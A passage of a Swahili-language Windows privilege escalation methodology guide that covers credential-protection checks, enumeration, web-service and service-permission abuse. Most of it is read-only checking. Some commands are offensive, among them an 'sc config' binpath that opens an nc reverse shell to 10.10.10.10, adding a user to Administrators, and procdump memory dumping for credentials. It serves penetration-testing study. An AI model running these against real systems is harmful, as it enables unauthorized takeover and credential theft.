reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding, ni muhimu kujua logs zinatumwa wapi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** imeundwa kwa ajili ya **usimamizi wa nywila za Administrator wa ndani**, na kuhakikisha kwamba kila nywila ni **ya kipekee, imetengenezwa kwa nasibu, na inasasishwa mara kwa mara** kwenye kompyuta zilizojiunga na domain. Nywila hizi huhifadhiwa kwa usalama ndani ya Active Directory na zinaweza kufikiwa tu na watumiaji waliopewa ruhusa za kutosha kupitia ACLs, na hivyo kuwaruhusu kuona nywila za admin wa ndani ikiwa wameidhinishwa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ikiwa imewashwa, **nywila za maandishi wazi huhifadhiwa kwenye LSASS** (Local Security Authority Subsystem Service).\
[**Maelezo zaidi kuhusu WDigest kwenye ukurasa huu**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Kuanzia **Windows 8.1**, Microsoft ilianzisha ulinzi ulioimarishwa wa Local Security Authority (LSA) ili **kuzuia** michakato isiyoaminika kujaribu **kusoma kumbukumbu yake** au kuingiza code, na hivyo kulinda mfumo zaidi.\
[**Maelezo zaidi kuhusu LSA Protection hapa**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** ilianzishwa katika **Windows 10**. Madhumuni yake ni kulinda credentials zilizohifadhiwa kwenye kifaa dhidi ya vitisho kama vile mashambulizi ya pass-the-hash. [**Maelezo zaidi kuhusu Credential Guard yanapatikana hapa.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Vitambulisho Vilivyohifadhiwa kwenye Akiba

**Vitambulisho vya domain** huthibitishwa na **Local Security Authority** (LSA) na kutumiwa na vipengele vya mfumo wa uendeshaji. Data za kuingia za mtumiaji zinapothibitishwa na kifurushi cha usalama kilichosajiliwa, kwa kawaida huanzishwa vitambulisho vya domain vya mtumiaji.\
[**Maelezo zaidi kuhusu Vitambulisho Vilivyohifadhiwa kwenye Akiba hapa**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Watumiaji na Vikundi

### Orodhesha Watumiaji na Vikundi

Unapaswa kuangalia kama kuna vikundi ambavyo wewe ni mwanachama vina ruhusa za kuvutia.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Vikundi vyenye haki za juu

Ukiwa mwanachama wa **kikundi chenye haki za juu, unaweza kuongeza haki zako**. Jifunze kuhusu vikundi vyenye haki za juu na jinsi ya kuvitumia vibaya ili kuongeza haki zako hapa:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Udhibiti wa token

**Jifunze zaidi** kuhusu **token** ni nini kwenye ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Angalia ukurasa ufuatao ili **kujifunza kuhusu token za kuvutia** na jinsi ya kuzitumia vibaya:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Watumiaji walioingia / Sessions

```bash
qwinsta
klist sessions
```

### Folda za nyumbani

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Sera ya Nenosiri

```bash
net accounts
```

### Pata maudhui ya ubao wa kunakili

```bash
powershell -command "Get-Clipboard"
```

## Michakato Inayoendeshwa

### Ruhusa za Faili na Folda

Kwanza kabisa, unapoorodhesha michakato **angalia kama kuna nywila ndani ya mstari wa amri wa mchakato**.\
Angalia kama unaweza **kuandika juu ya binary yoyote inayoendeshwa** au kama una ruhusa za kuandika kwenye folda ya binary ili kutumia [**DLL Hijacking attacks**](dll-hijacking/index.html) zinazowezekana:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Daima angalia kama kuna [**electron/cef/chromium debuggers** zinazoendesha, unaweza kuzitumia vibaya ili kuongeza privileges](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Debugger listener inaweza kudumu kwa muda mfupi, kwa hiyo kutokuwepo kwake kwenye snapshot moja ya passive ya ports hakuthibitishi kwamba haikuwahi kufichuliwa. Linganisha listener yoyote uliyoona na PID yake, mmiliki wa process, na uwezo wa mtumiaji mwenye privileges za chini kuifikia; jina la programu au debug flag pekee havithibitishi uwezo wa kutekeleza code kati ya watumiaji. Fanya enumeration ya kawaida kwa njia ya passive badala ya kutuma debugger commands.

**Kuangalia permissions za binary za processes**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Kukagua ruhusa za folda za binary za michakato (**[**DLL Hijacking**](dll-hijacking/index.html)**)****

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Saraka za dynamic preprocessor za Snort

Snort 2 inaweza kupakia shared libraries kutoka kwenye `dynamicpreprocessor directory` iliyotajwa kwenye configuration iliyochaguliwa kwa `snort.exe -c <config>`. Kwa scheduled task au service inayoendesha Snort kwa kutumia akaunti tofauti, kagua configuration hiyo mahususi na ACL ya saraka ya modules iliyotajwa. Ikiwa token yako inaweza kuunda files hapo, path hiyo inafaa kuchunguzwa kama njia ya kutekeleza code wakati task au service hiyo itakapopakia modules tena. Thibitisha privileges halisi za akaunti inayoendesha programu, configuration inayotumika, ulinganifu wa modules, na vizuizi vyovyote vya deny au share; saraka inayoweza kuandikwa pekee haithibitishi privilege escalation. [Nyaraka za Snort kuhusu dynamic-preprocessor](https://www.snort.org/documents/dpx-readme) zinaeleza upakiaji wa modules wakati wa runtime.

### Web service yenye privileges ya juu na document root inayoweza kuandikwa

Kwenye usakinishaji wa Apache wa Windows, linganisha path ya executable ya service na akaunti inayoendesha programu na `DocumentRoot` kwenye `httpd.conf` yake inayotumika. Kwa mpangilio wa kawaida wa XAMPP, kagua `C:\xampp\apache\conf\httpd.conf` na ACL ya document root iliyosanidiwa, mara nyingi `C:\xampp\htdocs`. Ikiwa mtumiaji mwenye privileges za chini anaweza kuunda files kwenye root hiyo huku Apache ikiendeshwa kama `LocalSystem`, kutekeleza code upande wa seva kunaweza kuvuka mpaka wa privileges wa host. Thibitisha kuwa service inafanya kazi, kuwa path halisi inatolewa na seva, na kuwa handler ya upande wa seva inachakata aina hiyo ya file; root inayoweza kuandikwa pekee inathibitisha tu uwezo wa kuunda file. Kagua ACL bila kuandika probe:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Kwa usakinishaji wa kawaida wa WAMP, huduma inaweza kuelekeza kwenye `C:\wamp64\bin\apache\apache*\bin\httpd.exe` yenye toleo maalum (au `C:\wamp\...` kwa mpangilio wa biti 32), huku usanidi ukiwa karibu nayo chini ya `conf\httpd.conf` na mzizi chaguomsingi ukiwa `C:\wamp64\www` au `C:\wamp\www`. Kagua pamoja picha halisi ya huduma, utambulisho inayoendeshwa nao, `DocumentRoot` inayotumika (ikijumuisha upanuzi wa `${INSTALL_DIR}` na ubandikaji wa virtual host), na ACL ya mzizi. Saraka ya WAMP inayoweza kuandikwa haithibitishi kwamba Apache inaendeshwa kama `SYSTEM` au itatekeleza faili iliyowasilishwa. [Apache inaeleza jinsi huduma ya Windows huchagua usanidi wake](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Mzizi wa IIS unaoweza kuandikwa na utambulisho wa mtandao wa application pool

Kwa IIS, husisha saraka halisi inayoweza kuandikwa na **site/application inayotumika** katika `applicationHost.config`, kisha tambua pool yake iliyosanidiwa na handler ya upande wa seva. Msimbo uliowekwa kwenye saraka inayotolewa huendeshwa kama pool tu ikiwa IIS huchakata aina hiyo ya faili na njia hiyo inaweza kufikiwa. Kagua ruhusa ya sasa ya mtumiaji ya kuunda faili, hali ya runtime ya site, handler na mipangilio ya njia husika kabla ya kudhani kuwa saraka inayoweza kuandikwa inaruhusu utekelezaji wa msimbo.

Uchanganyaji wa ASP.NET unaobadilika huleta njia tofauti ya kukagua: faili zinazozalishwa chini ya saraka ya compilation ya programu. Chaguomsingi ni saraka ya `Temporary ASP.NET Files` iliyo chini ya usakinishaji husika wa .NET Framework, lakini `<compilation tempDirectory>` ya programu inaweza kuibadilisha. [Microsoft inaeleza mahali ilipo na saraka zake ndogo za kila programu](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) na [inapendekeza kutenga saraka za compilation wakati application pool haziaminiani](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Ikiwa tokeni yenye mapendeleo ya chini inaweza kubadilisha source iliyozalishwa kwenye cache ya programu **husika**, bainisha kama programu hiyo itai-compile upya chini ya [utambulisho wa worker process](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) wenye mapendeleo zaidi. ACL ya faili au saraka peke yake haithibitishi utekelezaji wa msimbo: linganisha cache na programu inayotumika, tokeni na ACL zinazotumika, mipangilio ya compilation, utambulisho wa process, na muda wa compilation yoyote upya. Tumia ukaguzi wa metadata wa kusoma pekee; usianzisha compilation wala kubadilisha faili za cache wakati wa enumeration.

IIS pool iliyosanidiwa kama `ApplicationPoolIdentity` au `NetworkService` kwa kawaida huthibitisha utambulisho wake kwenye rasilimali za domain kama **akaunti ya kompyuta mwenyeji**, ingawa tokeni yake ya ndani inaweza kuwa na mapendeleo ya chini. `LocalSystem` tayari ina mapendeleo ya juu kwenye mashine ya ndani na pia hutumia akaunti ya kompyuta kwenye mtandao; `LocalService` kwa kawaida hutumia vitambulisho vya mtandao visivyojulikana. Pool ya `SpecificUser` hutumia akaunti yake iliyosanidiwa. [Microsoft inaeleza aina hizi za utambulisho](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) na [utambulisho wa mtandao wa application pool](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Mpangilio wa utambulisho usipoainishwa unaweza kurithi chaguomsingi za pool, ambazo hutofautiana kati ya vizazi vya IIS; kwa hiyo, bainisha usanidi unaotumika badala ya kukisia kutokana na jina la pool. Ikiwa utekelezaji wa msimbo unafikia pool yenye utambulisho wa mtandao wa akaunti ya kompyuta, tathmini ruhusa za directory za **kompyuta hiyo mahususi**. [DCSync](../active-directory-methodology/dcsync.md) huhitaji ruhusa za replication kwenye muktadha wa majina wa domain; tiketi ya akaunti ya mashine au jukumu la host peke yake havithibitishi ruhusa hizo. Enumeration tulivu inapaswa kukagua usanidi na ACL bila kupakia faili, kuanzisha uthibitishaji wa mtandao, au kuomba tiketi.

Kwa handler ya ASP.NET inayoweza kusomwa na kuanzisha helper process, fuatilia thamani yoyote inayotokana na ombi kupitia uthibitishaji, usimbuaji fiche, uhalalishaji na uundaji wa amri. Handler inayounganisha tokeni iliyodecode kwenye `ProcessStartInfo("cmd", "/c ...")` inaweza kuruhusu alama maalum za shell kubadilisha amri; [Microsoft inaeleza herufi maalum za `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Thibitisha kwamba mpigaji asiyeaminika anaweza kweli kuathiri thamani iliyodecode na kufikia handler, kisha bainisha utambulisho unaotumika wa application pool au wa kujifanya mtumiaji mwingine, pamoja na utambulisho wa child process. Mstari wa source unaosomeka, listener ya localhost, au udhaifu wa umbizo la tokeni peke yake havithibitishi utekelezaji wa amri wenye mapendeleo. Kagua source na usanidi wa pool bila kutuma maombi ya kughushi au kuendesha helper wakati wa enumeration tulivu.

Kwa huduma ya PHP kwenye Windows, njia inayodhibitiwa na ombi na kupitishwa kwa [`include` au `require`](https://www.php.net/manual/en/function.include.php) inaweza kutekeleza faili ya PHP inayoweza kuandikwa na mtumiaji mwenye mapendeleo ya chini chini ya utambulisho wa worker. Thibitisha kwamba ombi linaweza kufikia kauli hiyo, njia iliyotatuliwa inaelekeza kwenye faili ambayo mtumiaji mwenye mapendeleo ya chini anaweza kubadilisha na worker anaweza kusoma, vizuizi husika vya njia za PHP vinaruhusu include, na worker inaendeshwa kweli ikiwa na mapendeleo ya juu zaidi. Listener ya loopback au faili inayoweza kuandikwa peke yake havithibitishi mlolongo huu; kagua source, utambulisho wa huduma na ACL za faili bila kuita endpoint wakati wa enumeration tulivu.

### Uchimbaji wa Nenosiri kutoka Kumbukumbu

Unaweza kuunda dump ya kumbukumbu ya process inayoendelea kutumia **procdump** kutoka sysinternals. Huduma kama FTP huwa na **credentials katika maandishi ya wazi kwenye kumbukumbu**; jaribu kutengeneza dump ya kumbukumbu na kusoma credentials.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Programu za GUI zisizo salama

**Programu zinazoendeshwa kama SYSTEM zinaweza kumruhusu mtumiaji kufungua CMD au kuvinjari saraka.**

Mfano: "Windows Help and Support" (Windows + F1), tafuta "command prompt", bofya "Click to open Command Prompt"

### Uingizaji wa faili za mradi wenye upendeleo

Programu inayofungua kiotomatiki miradi kutoka kwenye saraka ya drop inayoweza kuandikwa na mtumiaji wa kiwango cha chini huvuka mpaka wa uaminifu wa ingizo chini ya akaunti ya programu inayoingiza. Kagua **njia halisi inayoweza kuandikwa**, mchakato au task inayoifungua, utambulisho wake halisi, na build ya parser. [Tatizo la kihistoria la kufungua/kurejesha mradi wa Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) liliruhusu external entities za XML kwenye metadata ya mradi; entity ya mtandao kwenye Windows inaweza kusababisha uthibitishaji kutoka kwa akaunti inayoingiza ikiwa [sera ya SMB na NTLM ya miunganisho inayotoka](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) inaruhusu. Hili ni dokezo la uwezekano wa kufichuka kwa taarifa za uthibitishaji, si ufikiaji wa msimamizi wa moja kwa moja: jibu lazima liweze kutumika kupitia njia tofauti iliyoidhinishwa au iliyo hatarini, na build za sasa lazima zikaguliwe kulingana na hali halisi ya masasisho yake. Usifungue mradi uliotengenezwa kwa makusudi wakati wa uchunguzi tulivu; kagua mtiririko wa uingizaji na ACL.

## Services

[`SC_MANAGER_CREATE_SERVICE` right](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) ya kitu cha Service Control Manager (SCM) ni tofauti na haki za service iliyopo. Ombi la kusoma tu la [`OpenSCManager` access](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) lililofanikiwa kwa haki hiyo ni dokezo la kukaguliwa, si uthibitisho kwamba service mpya inaweza kuendeshwa. [`CreateService` hurejesha handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) yenye access ya service iliyoombwa wakati wa kuunda; kuifungua tena service baadaye hufanya ukaguzi tofauti wa access na kunaweza kushindikana hata kama handle ya awali ingeweza kutumika. Thibitisha kando tokeni halisi ya ndani au ya mbali, haki za handle zilizotolewa, akaunti ya service, sera ya kuanzisha, na njia ya executable. Usitengeneze wala kuanzisha service wakati wa uchunguzi tulivu.

Kwa njia ya kusakinisha service kwa mbali, linganisha haki hizo za SCM na share kwenye target ambayo **logon hiyo hiyo ya mtandao** inaweza kuandikia, ACL yake ya msingi ya NTFS, na njia ya executable ya ndani ambayo akaunti ya service inaweza kuendesha. Akaunti isiyo ya admin inaweza kuvuka mpaka huu ikiwa kuna haki pana isivyo kawaida za SCM na njia ya kuweka faili; share ya kiutawala si sharti la lazima. Ruhusa ya kuandika kwenye share pekee, au dokezo la haki ya kuunda service katika SCM pekee, havithibitishi kwamba service mpya inaweza kuanzishwa chini ya utambulisho wa juu zaidi.

Service iliyopo inaweza kuita executable saidizi wakati wa kuanza, kuzimwa, au tukio jingine la mzunguko wa maisha hata kama executable hiyo haipo kwenye `ImagePath` yake. Ikiwa jina la executable saidizi linatafutwa kwenye saraka inayoweza kuandikiwa na mtumiaji wa kiwango cha chini na service inaendeshwa chini ya utambulisho wa juu zaidi, faili saidizi inayokosekana inaweza kuwa mgombea wa kubadilishwa kwa masharti. Thibitisha **code halisi ya service au mwito wa executable saidizi ulioandikwa kwenye nyaraka**, njia na mpangilio halisi wa kutafuta executable, ruhusa za kuunda saraka, utambulisho wa service, na kichochezi cha mzunguko wa maisha kinachopatikana. Saraka ya service inayoweza kuandikiwa au faili inayokosekana pekee havithibitishi kwamba service itapakia faili hiyo; ukaguzi tulivu haupaswi kuanzisha wala kusimamisha service.

Kwa service iliyopo, [`SERVICE_START` huruhusu kutoa hoja kwa `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); ni tofauti na [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Kagua code ya service au kiolesura chake kilichoandikwa kwenye nyaraka kabla ya kuichukulia ruhusa ya kuanzisha kuwa zaidi ya haki ya kudhibiti. Ikiwa inatumia hoja iliyochaguliwa na mpigaji kama njia ya log au export, thibitisha utambulisho wa service, mtiririko halisi wa hoja hadi uandishi, vizuizi vya njia, na ruhusa za **faili iliyoundwa**. Uandishi kwenye saraka iliyolindwa unaweza kuwa njia ya kupandisha upendeleo tu kukiwa na consumer au loader tofauti yenye upendeleo inayokubali faili hiyo; log inayoweza kuandikwa au haki ya kuanzisha pekee haitoshi. Orodha ya mali tulivu haipaswi kuanzisha service wala kuunda faili ya majaribio.

Kwa agent ya ufuatiliaji ya NSClient++, `nsclient.ini` inayosomeka ni **dokezo la kukagua usanidi**: inaweza kuwa na credentials za wavuti, huku `boot.ini` ikiweza kuelekeza usanidi kwenye eneo jingine. Kagua akaunti halisi ya service, listener ya WEB na sera ya access, na kama role iliyothibitishwa inaweza kubadilisha mipangilio au scripts. Utekelezaji wenye upendeleo unahitaji pia `CheckExternalScripts` (au njia nyingine ya utekelezaji iliyoanzishwa), haki inayotumika ya kusajili au kurekebisha amri, na kichochezi kinachoiendesha chini ya utambulisho wa service. Listener inayokubali miunganisho ya loopback pekee bado inaweza kufikiwa na mtumiaji wa ndani, lakini njia ya faili, password, au listener pekee havithibitishi haki hizo. Kagua metadata na ruhusa bila kuonyesha siri wala kuita web API wakati wa uchunguzi tulivu. Tazama [muundo wa faili wa NSClient++](https://nsclient.org/docs/concepts/file-layout/), [mwongozo wa usalama wa wavuti na scripts](https://nsclient.org/docs/setup/securing/), na [usanidi wa external-script](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Kwa service ambayo `ImagePath` yake ni `nssm.exe`, kagua akaunti halisi ya run-as ya service na thamani yake ya `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM huhifadhi programu child hapo](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), huku `AppDirectory` ikiwa saraka yake ya working iliyosanidiwa. Kagua executable ya child na ACL za saraka zake za mzazi kabla ya kuchukulia ruhusa za wrapper kuwa ndizo mpaka mzima wa service. Endpoint ya ndani ya WCF au SOAP inayofichuliwa na child hiyo ni dokezo tofauti la kukaguliwa: thibitisha kwamba mtumiaji mwenye upendeleo wa chini anaweza kufikia listener, kwamba operesheni halisi inakubali ingizo lake, na kwamba child ya service hutekeleza operesheni isiyo salama chini ya utambulisho wa juu zaidi. Akaunti ya service, URL ya endpoint, au njia inayoweza kuandikiwa pekee havithibitishi kupandisha upendeleo; epuka kuita operesheni za service wakati wa uchunguzi tulivu.

Kwa operesheni maalum ya WCF, fuatilia stringi inayodhibitiwa na mpigaji inapoingia kwenye runspace yoyote ya PowerShell. [`Pipeline.Commands.AddScript huongeza maandishi ya script`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), na [`Pipeline.Invoke huendesha pipeline`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` yenye credentials za Windows za transport](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) huthibitisha client, lakini ruhusa ya kuita operesheni **hiyo mahususi** na utambulisho halisi wa runspace lazima vikaguliwe kando. Njia kutoka kwenye ingizo la mpigaji mwenye upendeleo wa chini hadi `AddScript` chini ya utambulisho wa juu wa service ni mpaka wa utekelezaji wa code; port inayosikilizwa, client aliyethibitishwa, au method isiyotumika kwenye assembly isiyohusiana pekee si uthibitisho. Kagua service iliyosakinishwa, contract, uidhinishaji na mipangilio ya impersonation kwa njia tuli, bila kuita endpoint wakati wa uchunguzi.

Service Triggers huwezesha Windows kuanzisha service hali fulani zinapotokea (shughuli za named pipe/RPC endpoint, matukio ya ETW, upatikanaji wa IP, kifaa kuunganishwa, uonyeshaji upya wa GPO, n.k.). Hata bila haki za SERVICE_START, mara nyingi unaweza kuanzisha services zenye upendeleo kwa kuwasha triggers zake. Tazama mbinu za enumeration na activation hapa:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Service ya Visual Studio ya kukusanya diagnostics

Usakinishaji wa Visual Studio wenye zana za C/C++ unaweza kujumuisha `VSStandardCollectorService150`, service ya diagnostics iliyosanidiwa kuendeshwa kama `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) ilitumia race ya junction na object-manager-link kuelekeza upya uwekaji upya wa DACL ya service. Kupandisha upendeleo kulikoonyeshwa kulihitaji pia njia inayoweza kutumika ya kurekebisha MSI ya Visual Studio Setup WMI Provider na target yake ya `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Kipengele hicho kilirekebishwa Januari 2024.

Kwa uchunguzi wa awali tulivu, kagua akaunti na njia ya binary ya service hiyo, angalia kama njia ya Setup WMI compiler ipo, na thibitisha hali ya masasisho ya kipengele kilichosakinishwa. Ingizo la service, toleo la bidhaa ya Visual Studio, au faili ya compiler pekee havithibitishi kwamba host iko hatarini. Ukaguzi hauhitaji kuanzisha service wala kuendesha repair.

Pata orodha ya services:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Ruhusa

Unaweza kutumia **sc** kupata taarifa kuhusu huduma】【。

```bash
sc qc <service_name>
```

Inashauriwa kuwa na binary **accesschk** kutoka _Sysinternals_ ili kuangalia kiwango cha upendeleo kinachohitajika kwa kila huduma.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Inapendekezwa kuangalia kama "Authenticated Users" wanaweza kurekebisha huduma yoyote:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Unaweza kupakua accesschk.exe ya XP hapa](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Washa service

Ikiwa unapata kosa hili (kwa mfano, ukiwa na SSDPSRV):

_Kosa la mfumo 1058 limetokea._\
_Huduma haiwezi kuanzishwa, ama kwa sababu imezimwa au haina vifaa vilivyowashwa vinavyohusishwa nayo._

Unaweza kuiwasha kwa kutumia

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Zingatia kwamba huduma ya upnphost inategemea SSDPSRV ili kufanya kazi (kwa XP SP1)**

**Suluhisho jingine la muda** la tatizo hili ni kutekeleza:

```
sc.exe config usosvc start= auto
```

### **Badilisha njia ya binary ya service**

Katika hali ambapo kundi la "Authenticated users" lina **SERVICE_ALL_ACCESS** kwenye service, inawezekana kurekebisha binary inayotekelezwa ya service. Ili kurekebisha na kutekeleza **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Anzisha upya huduma

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Mapendeleo yanaweza kuongezwa kupitia ruhusa mbalimbali:

- **SERVICE_CHANGE_CONFIG**: Huruhusu kubadilisha usanidi wa binary ya service.
- **WRITE_DAC**: Huruhusu kubadilisha usanidi wa ruhusa, na hivyo kuwezesha kubadilisha usanidi wa service.
- **WRITE_OWNER**: Huruhusu kupata umiliki na kubadilisha usanidi wa ruhusa.
- **GENERIC_WRITE**: Hurithisha uwezo wa kubadilisha usanidi wa service.
- **GENERIC_ALL**: Pia hurithisha uwezo wa kubadilisha usanidi wa service.

Kwa ajili ya kugundua na kutumia udhaifu huu, _exploit/windows/local/service_permissions_ inaweza kutumika.

### Ruhusa dhaifu za binary za services

Ikiwa service inaendeshwa kama **`LocalSystem`**, **`LocalService`**, **`NetworkService`**, au akaunti ya domain yenye mapendeleo, lakini **watumiaji wenye mapendeleo ya chini wanaweza kurekebisha EXE ya service au folda yake kuu**, mara nyingi service inaweza kutekwa kwa **kubadilisha binary na kuwasha upya service**.

**Angalia kama unaweza kurekebisha binary inayoendeshwa na service** au kama una **ruhusa za kuandika kwenye folda** ilipo binary ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Unaweza kupata binary zote zinazoendeshwa na service kwa kutumia **wmic** (si katika system32) na kukagua ruhusa zako kwa kutumia **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Unaweza pia kutumia **sc** na **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Tafuta ACL hatari zilizotolewa kwa **`Everyone`**, **`BUILTIN\Users`**, au **`Authenticated Users`**, hasa **`(F)`**, **`(M)`**, au **`(W)`** kwenye executable ya service au directory iliyo nayo. Mtiririko wa kawaida wa abuse ni:<sup>[[27]](#references)</sup>

1. Thibitisha akaunti ya service na path ya executable kwa kutumia `sc qc <service_name>`.
2. Thibitisha kuwa binary inaweza kuandikwa kwa kutumia `icacls <path>`.
3. Badilisha binary ya service kwa payload au binary halali hasidi ya service.
4. Anzisha upya service kwa kutumia `sc stop <service_name> && sc start <service_name>` (au subiri kuwashwa upya kwa kompyuta / kichocheo cha service).

Ukaguzi wa kiotomatiki unaofaa:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Ikiwa service hairuhusu mtumiaji wa kawaida kuianzisha upya, angalia kama inaanza kiotomatiki wakati wa kuwasha mfumo, ina failure action inayoianzisha tena, au inaweza kuwashwa kwa njia isiyo ya moja kwa moja na application inayoitumia.

### Ruhusa za kurekebisha service registry

Unapaswa kuangalia kama unaweza kurekebisha service registry yoyote.\
Unaweza **kuangalia** **ruhusa** zako kwenye **registry** ya service kwa kufanya:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

